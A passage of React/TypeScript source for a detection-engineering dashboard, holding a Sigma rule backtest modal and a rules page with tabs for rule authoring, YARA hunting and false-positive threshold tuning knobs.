                                <span className="text-[10px] text-text-faint">{m.timestamp?.slice(0, 19).replace("T", " ")}</span>
                              </div>
                              <p className="mt-0.5 truncate text-text-primary text-[10px]" title={m.command_line || m.match_reason}>
                                {m.match_reason || m.command_line}
                              </p>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}


function RuleBacktestModal({
  ruleId,
  ruleName,
  customYaml,
  onClose,
}: {
  ruleId?: string;
  ruleName: string;
  customYaml?: string;
  onClose: () => void;
}) {
  const [maxEvents, setMaxEvents] = useState(2000);
  const [running, setRunning] = useState(false);
  const [result, setResult] = useState<RuleBacktestResult | null>(null);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") onClose();
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [onClose]);

  const runBacktest = async () => {
    setRunning(true);
    setError(null);
    try {
      if (customYaml) {
        const res = await backtestCustomRule({ sigma_yaml: customYaml, max_events: maxEvents });
        setResult(res);
      } else if (ruleId) {
        const res = await backtestRule(ruleId, maxEvents);
        setResult(res);
      }
    } catch (err) {
      setError(err instanceof Error ? err.message : "Backtest evaluation failed");
    } finally {
      setRunning(false);
    }
  };

  useEffect(() => {
    void runBacktest();
  }, [ruleId, customYaml]);

  return (
    <div
      role="dialog"
      aria-modal="true"
      aria-label={`Historical Rule Backtest — ${ruleName}`}
      className="fixed inset-0 z-50 flex justify-end bg-black/60 backdrop-blur-xs transition-opacity"
      onClick={onClose}
    >
      <div
        className="flex h-full w-full max-w-2xl flex-col border-l border-border-subtle bg-bg-surface shadow-2xl animate-slide-in overflow-hidden"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="flex items-center justify-between border-b border-border-subtle px-6 py-4 bg-bg-base/70">
          <div>
            <span className="font-mono text-[10px] uppercase tracking-wide text-text-faint">Detection Validation &amp; Backtesting</span>
            <h3 className="font-mono text-sm font-bold text-text-primary">
              Historical Rule Backtest — <span className="text-accent">{ruleName}</span>
            </h3>
          </div>
          <button onClick={onClose} className="rounded-lg p-1 text-text-muted hover:bg-bg-base hover:text-text-primary">
            <Icon name="x" size={16} />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto p-6 space-y-4">
          <div className="flex flex-wrap items-center justify-between gap-3 font-mono text-xs">
            <div className="flex items-center gap-2">
              <span className="text-text-faint">Scanned Window:</span>
              <select
                value={maxEvents}
                onChange={(e) => setMaxEvents(Number(e.target.value))}
                disabled={running}
                className="rounded border border-border-subtle bg-bg-base px-2 py-1 text-text-primary outline-none focus:border-accent"
              >
                <option value={500}>Last 500 Events</option>
                <option value={1000}>Last 1,000 Events</option>
                <option value={2000}>Last 2,000 Events</option>
                <option value={5000}>Last 5,000 Events</option>
              </select>
            </div>
            <button
              onClick={() => void runBacktest()}
              disabled={running}
              className="press inline-flex items-center gap-1.5 rounded-lg border border-accent/60 bg-accent/15 px-3 py-1.5 font-bold text-accent hover:bg-accent/25 disabled:opacity-50"
            >
              <Icon name={running ? "refresh" : "play"} size={12} className={running ? "animate-spin" : ""} />
              {running ? "Scanning History…" : "Re-run Backtest"}
            </button>
          </div>

          {error && <p className="font-mono text-xs text-risk-malicious">{error}</p>}

          {result && (
            <div className="space-y-3 font-mono">
              <div className="grid grid-cols-3 gap-3">
                <div className="rounded-xl border border-border-subtle bg-bg-base/60 p-3">
                  <span className="text-[10px] text-text-faint uppercase">Events Evaluated</span>
                  <p className="text-base font-bold text-text-primary mt-1">{result.events_scanned}</p>
                </div>
                <div className="rounded-xl border border-border-subtle bg-bg-base/60 p-3">
                  <span className="text-[10px] text-text-faint uppercase">Rule Trigger Hits</span>
                  <p className="text-base font-bold text-accent mt-1">{result.matches_count} ({result.match_rate_pct}%)</p>
                </div>
                <div className="rounded-xl border border-border-subtle bg-bg-base/60 p-3">
                  <span className="text-[10px] text-text-faint uppercase">Est. False Positive Risk</span>
                  <p className={`text-base font-bold mt-1 uppercase ${result.estimated_fp_risk === "low" ? "text-emerald-400" : result.estimated_fp_risk === "medium" ? "text-amber-400" : "text-rose-500"}`}>
                    {result.estimated_fp_risk}
                  </p>
                </div>
              </div>

              <div className="space-y-2">
                <span className="text-[10px] uppercase font-bold text-text-faint">Matched Historical Events ({result.sample_matches.length}):</span>
                {result.sample_matches.length === 0 ? (
                  <p className="text-xs text-text-muted py-2">Zero matching events triggered across the historical sample window.</p>
                ) : (
                  <div className="max-h-60 overflow-y-auto space-y-1.5 pr-1">
                    {result.sample_matches.map((m: any, idx: number) => (
                      <div key={idx} className="rounded-lg border border-border-subtle bg-bg-base/80 p-2.5 text-[11px]">
                        <div className="flex items-center justify-between text-text-muted">
                          <span className="font-bold text-accent">{m.process_name || m.event_type}</span>
                          <span className="text-[9px] text-text-faint">{m.timestamp?.slice(0, 19).replace("T", " ")}</span>
                        </div>
                        <p className="mt-1 truncate text-text-primary" title={m.command_line || m.match_reason}>
                          {m.match_reason || m.command_line}
                        </p>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}


export default function RulesPage() {
  const queryClient = useQueryClient();
  const [searchParams] = useSearchParams();
  const { data, isLoading, isError } = useQuery({ queryKey: ["tuning"], queryFn: getTuning });
  const { data: fp } = useQuery({ queryKey: ["rule-fp"], queryFn: getRuleFp });
  const [activeTab, setActiveTab] = useState<"rules" | "coverage">("rules");
  const [subDeck, setSubDeck] = useState<"sigma" | "knobs" | "yara" | "patterns" | "packs">(() => {
    const tabParam = searchParams.get("tab");
    if (tabParam && ["sigma", "knobs", "yara", "patterns", "packs"].includes(tabParam)) {
      return tabParam as any;
    }
    return "sigma";
  });
  const [knobFilter, setKnobFilter] = useState("");
  const [showOverriddenOnly, setShowOverriddenOnly] = useState(false);
  const [drafts, setDrafts] = useState<Record<string, string>>({});
  const [fpDraft, setFpDraft] = useState<string>("");
  const [backtestingRule, setBacktestingRule] = useState<{ id?: string; name: string; customYaml?: string } | null>(null);

  useEffect(() => {
    if (fp) setFpDraft((d) => (d === "" ? String(fp.threshold) : d));
  }, [fp]);

  const save = useMutation({
    mutationFn: ({ param, value }: { param: string; value: string }) => setTuning(param, value),
    onSuccess: () => void queryClient.invalidateQueries({ queryKey: ["tuning"] }),
  });
  const reset = useMutation({
    mutationFn: (param: string) => resetTuning(param),
    onSuccess: () => void queryClient.invalidateQueries({ queryKey: ["tuning"] }),
  });
  const saveFpThreshold = useMutation({
    mutationFn: (threshold: number) => setFpThreshold(threshold),
    onSuccess: () => {
      void queryClient.invalidateQueries({ queryKey: ["rule-fp"] });
      setFpDraft("");
    },
  });
  const resetFp = useMutation({
    mutationFn: () => resetFpThreshold(),
    onSuccess: () => {
      void queryClient.invalidateQueries({ queryKey: ["rule-fp"] });
      setFpDraft("");
    },
  });
  // One-click apply of an FP-driven threshold raise.
  const applySuggestion = (s: RuleFpEntry["suggestion"]) => {
    if (!s) return;
    save.mutate({ param: s.param, value: String(s.suggested) }, {
      onSuccess: () => {
        void queryClient.invalidateQueries({ queryKey: ["rule-fp"] });
        void queryClient.invalidateQueries({ queryKey: ["tuning"] });
      },
    });
  };
  const fpFor = (ruleId: string): RuleFpEntry | undefined => fp?.rules.find((r) => r.rule_id === ruleId);
  const noisyCount = fp?.rules.filter((r) => r.over_threshold).length ?? 0;

  return (
    <div className="mx-auto max-w-7xl px-6 py-8 lg:px-10 space-y-6">
      <PageHeader
        kicker="Detection Engineering &amp; Threat Intelligence"
        title="Detection Engineering Studio"
        lede="Author and transpile Sigma/YARA rules, run historical event backtests, and inspect MITRE ATT&CK coverage."
      />

      {/* Main Tab Switcher */}
      <div className="flex rounded-xl border border-border-subtle bg-bg-surface p-1 font-mono text-xs shadow-sm">
        <button
          onClick={() => setActiveTab("rules")}
          className={`flex flex-1 items-center justify-center gap-2 rounded-lg py-2 font-medium transition ${
            activeTab === "rules"
              ? "bg-accent/15 font-bold text-accent shadow-sm"
              : "text-text-muted hover:text-text-primary"
          }`}
        >
          <Icon name="shield" size={13} />
          <span>Detection Rules &amp; Sigma Authoring</span>
        </button>
        <button
          onClick={() => setActiveTab("coverage")}
          className={`flex flex-1 items-center justify-center gap-2 rounded-lg py-2 font-medium transition ${
            activeTab === "coverage"
              ? "bg-accent/15 font-bold text-accent shadow-sm"
              : "text-text-muted hover:text-text-primary"
          }`}
        >
          <Icon name="grid" size={13} />
          <span>MITRE ATT&amp;CK Coverage Matrix</span>
        </button>
      </div>

      {activeTab === "coverage" ? (
        <CoveragePage />
      ) : (
        <>
          {isLoading && <p className="mt-6 text-sm text-text-muted font-mono">Loading detection configurations…</p>}
          {isError && <p className="mt-6 text-sm text-risk-malicious font-mono">Couldn't load detection configurations — verify backend is running.</p>}

          {/* Sub-deck navigation switcher */}
          <div className="flex flex-wrap gap-2 border-b border-border-subtle pb-3 font-mono text-xs">
            <button
              onClick={() => setSubDeck("sigma")}
              className={`press flex items-center gap-1.5 rounded-lg px-3 py-1.5 border transition ${
                subDeck === "sigma"
                  ? "border-accent/50 bg-accent/15 text-accent font-bold shadow-xs"
                  : "border-border-subtle bg-bg-surface text-text-muted hover:text-text-primary"
              }`}
            >
              <Icon name="terminal" size={13} />
              <span>Sigma Detection Studio</span>
            </button>
            <button
              onClick={() => setSubDeck("knobs")}
              className={`press flex items-center gap-1.5 rounded-lg px-3 py-1.5 border transition ${
                subDeck === "knobs"
                  ? "border-accent/50 bg-accent/15 text-accent font-bold shadow-xs"
                  : "border-border-subtle bg-bg-surface text-text-muted hover:text-text-primary"
              }`}
            >
              <Icon name="sliders" size={13} />
              <span>Detection Knobs &amp; Tuning</span>
            </button>
            <button
              onClick={() => setSubDeck("yara")}
              className={`press flex items-center gap-1.5 rounded-lg px-3 py-1.5 border transition ${
                subDeck === "yara"
                  ? "border-accent/50 bg-accent/15 text-accent font-bold shadow-xs"
                  : "border-border-subtle bg-bg-surface text-text-muted hover:text-text-primary"
              }`}
            >
              <Icon name="zap" size={13} />
              <span>YARA Threat Hunting Lab</span>
            </button>
            <button
              onClick={() => setSubDeck("patterns")}
              className={`press flex items-center gap-1.5 rounded-lg px-3 py-1.5 border transition ${
                subDeck === "patterns"
                  ? "border-accent/50 bg-accent/15 text-accent font-bold shadow-xs"
                  : "border-border-subtle bg-bg-surface text-text-muted hover:text-text-primary"
              }`}
            >
              <Icon name="list" size={13} />
              <span>Recon &amp; Telemetry Patterns</span>
            </button>
            <button
              onClick={() => setSubDeck("packs")}
              className={`press flex items-center gap-1.5 rounded-lg px-3 py-1.5 border transition ${
                subDeck === "packs"
                  ? "border-accent/50 bg-accent/15 text-accent font-bold shadow-xs"
                  : "border-border-subtle bg-bg-surface text-text-muted hover:text-text-primary"
              }`}
            >
              <Icon name="box" size={13} />
              <span>Rule Packs &amp; Backup</span>
            </button>
          </div>

          {subDeck === "sigma" && <SigmaDetectionStudio onOpenBacktest={(rule) => setBacktestingRule(rule)} />}

          {subDeck === "yara" && <YaraLab />}

          {subDeck === "patterns" && (
            <div className="space-y-6">
              <EnumPatternsEditor />
              <LogPatternsEditor />
            </div>
          )}

          {subDeck === "packs" && (
            <div className="space-y-6">
              <RulePackPanel />
              <FactoryResetPanel />
            </div>
          )}

          {subDeck === "knobs" && (
            <>
              {/* FP feedback surface — noise threshold + per-rule counters */}
              {fp && (
                <div className="mb-4">
                  <div className="mb-3 flex flex-wrap items-center gap-3">
                    <div>
                      <p className="kicker">False-positive feedback · tunable</p>
                      <h2 className="mt-1 text-base font-semibold text-text-primary">Noise threshold</h2>
                    </div>
                    <div className="flex items-center gap-2">
                      <input
                        type="number"
                        min={1}
                        value={fpDraft !== "" ? fpDraft : String(fp.threshold)}
                        onChange={(e) => setFpDraft(e.target.value)}
                        className="w-20 rounded border border-border-subtle bg-bg-base px-2 py-1.5 font-mono text-sm text-text-primary focus:border-accent/60 focus:outline-none"
                        aria-label="FP suggestion threshold"
                      />
                      <button
                        onClick={() => {
                          const n = Math.max(1, Math.floor(Number(fpDraft) || fp.threshold));
                          saveFpThreshold.mutate(n);
                        }}
                        disabled={saveFpThreshold.isPending}
                        className="press rounded border border-accent/60 px-3 py-1.5 font-mono text-xs text-accent transition-colors duration-150 hover:bg-accent/10 disabled:opacity-50"
                      >
                        Set
                      </button>
                      {fp.threshold !== fp.default_threshold && (
                        <button
                          onClick={() => resetFp.mutate()}
                          className="press rounded border border-border-subtle px-3 py-1.5 font-mono text-xs text-text-muted transition-colors duration-150 hover:border-risk-malicious/50 hover:text-risk-malicious"
                        >
                          Reset
                        </button>
                      )}
                    </div>
                    <p className="w-full text-xs leading-relaxed text-text-muted">
                      A rule whose false-positive count reaches this value gets a one-click threshold-raise suggestion on its knob
                      below (raised by marking alerts as false positives on run detail). Currently{" "}
                      {noisyCount === 0 ? (
                        "no rule is over it."
                      ) : (
                        <span className="text-risk-suspicious">{noisyCount} rule{noisyCount === 1 ? " is" : "s are"} over it.</span>
                      )}
                    </p>
                  </div>
                </div>
              )}

              {/* Knobs Search & Filter Bar */}
              <div className="mt-4 mb-3 flex flex-wrap items-center justify-between gap-3">
                <div className="relative min-w-64 flex-1">
                  <Icon name="search" size={12} className="pointer-events-none absolute left-3 top-1/2 -translate-y-1/2 text-text-faint" />
                  <input
                    type="text"
                    value={knobFilter}
                    onChange={(e) => setKnobFilter(e.target.value)}
                    placeholder="Search knobs by name, parameter, or rule ID..."
                    className="w-full rounded-xl border border-border-subtle bg-bg-surface py-2 pl-9 pr-3 font-mono text-xs text-text-primary placeholder:text-text-faint focus:border-accent/60 focus:outline-none"
                  />
                </div>
                <button
                  type="button"
                  onClick={() => setShowOverriddenOnly(!showOverriddenOnly)}
                  className={`press inline-flex items-center gap-1.5 rounded-xl border px-3 py-2 font-mono text-xs transition ${
                    showOverriddenOnly
                      ? "border-accent/50 bg-accent/15 font-bold text-accent"
                      : "border-border-subtle bg-bg-surface text-text-muted hover:text-text-primary"
                  }`}
                >
                  <Icon name="filter" size={12} />
                  <span>{showOverriddenOnly ? "Tuned Overrides Only" : "All Knobs"}</span>
                </button>
              </div>

              {data && (
                <div className="mt-4 space-y-3">
                  {data.knobs
                    .filter((knob: TuningKnob) => {
                      if (showOverriddenOnly && !knob.tuned) return false;
                      if (!knobFilter.trim()) return true;
                      const q = knobFilter.toLowerCase().trim();
                      return (
                        knob.param.toLowerCase().includes(q) ||
                        knob.rule_id.toLowerCase().includes(q) ||
                        (KNOB_LABELS[knob.param] || "").toLowerCase().includes(q)
                      );
                    })
                    .map((knob: TuningKnob) => {
                      const fpRow = fpFor(knob.rule_id);
                      return (
                        <Panel key={knob.param} title={KNOB_LABELS[knob.param] ?? knob.param}>
                          <div className="flex flex-wrap items-center gap-3">
                            <code className="rounded border border-border-subtle bg-bg-elevated/50 px-2 py-1 font-mono text-[11px] text-accent">
                              {knob.param}
                            </code>
                            <span className="font-mono text-[10px] text-text-faint">
                              default {knob.default} · type {knob.type} · rule {knob.rule_id}
                            </span>
                            {fpRow && fpRow.count > 0 && (
                              <span
                                className={`rounded-full border px-2 py-0.5 font-mono text-[10px] tabular-nums ${
                                  fpRow.over_threshold
                                    ? "border-risk-suspicious/60 bg-risk-suspicious/10 text-risk-suspicious"
                                    : "border-border-subtle text-text-muted"
                                }`}
                                title={`${fpRow.count} false positive(s) — last ${fpRow.last_fp_at}`}
                              >
                                {fpRow.count} FP
                                {fpRow.fired_count > 0 && (
                                  <span className="opacity-80">
                                    {" "}· {Math.round((fpRow.count / fpRow.fired_count) * 100)}% rate
                                  </span>
                                )}
                              </span>
                            )}
                            {fpRow && fpRow.history && fpRow.history.length > 0 && (
                              <FpSparkline history={fpRow.history} />
                            )}
                            <span
                              className={`ml-auto rounded-full border px-2 py-0.5 font-mono text-[10px] uppercase tracking-wide ${
                                knob.tuned
                                  ? "border-accent/50 text-accent"
                                  : "border-border-subtle text-text-faint"
                              }`}
                            >
                              {knob.tuned ? "tuned" : "default"}
                            </span>
                          </div>
                          <div className="mt-3 flex flex-wrap items-center gap-2">
                            <input
                              type="text"
                              inputMode="numeric"
                              value={drafts[knob.param] ?? String(knob.current)}
                              onChange={(e) => setDrafts((d) => ({ ...d, [knob.param]: e.target.value }))}
                              className="w-36 rounded border border-border-subtle bg-bg-base px-2.5 py-1.5 font-mono text-sm text-text-primary focus:border-accent/60 focus:outline-none"
                              aria-label={knob.param}
                            />
                            <button
                              onClick={() => save.mutate({ param: knob.param, value: drafts[knob.param] ?? String(knob.current) })}
                              disabled={save.isPending}
                              className="press rounded border border-accent/60 px-3 py-1.5 font-mono text-xs text-accent transition-colors duration-150 hover:bg-accent/10 disabled:opacity-50"
                            >
                              Save
                            </button>
                            {knob.tuned && (
                              <button
                                onClick={() => reset.mutate(knob.param)}
                                className="press rounded border border-border-subtle px-3 py-1.5 font-mono text-xs text-text-muted transition-colors duration-150 hover:border-risk-malicious/50 hover:text-risk-malicious"
                              >
                                Reset
                              </button>
                            )}
                          </div>
                          {fpRow?.over_threshold && fpRow.suggestion && (
                            <div className="mt-3 flex flex-wrap items-center gap-2 rounded-lg border border-risk-suspicious/40 bg-risk-suspicious/10 px-3 py-2">
                              <Icon name="alert" size={12} className="text-risk-suspicious" />
                              <span className="text-xs text-text-muted">{fpRow.suggestion.detail}</span>
                              <button
                                onClick={() => applySuggestion(fpRow.suggestion)}
                                disabled={save.isPending}
                                className="press ml-auto rounded border border-risk-suspicious/60 px-2.5 py-1 font-mono text-[11px] text-risk-suspicious transition-colors duration-150 hover:bg-risk-suspicious/15 disabled:opacity-50"
                              >
                                Apply suggested
                              </button>
                            </div>
                          )}
                        </Panel>
                      );
                    })}
                </div>
              )}
            </>
          )}
        </>
      )}

      {backtestingRule && (
        <RuleBacktestModal
          ruleId={backtestingRule.id}
          ruleName={backtestingRule.name}
          customYaml={backtestingRule.customYaml}
          onClose={() => setBacktestingRule(null)}
        />
      )}
    </div>
  );
}

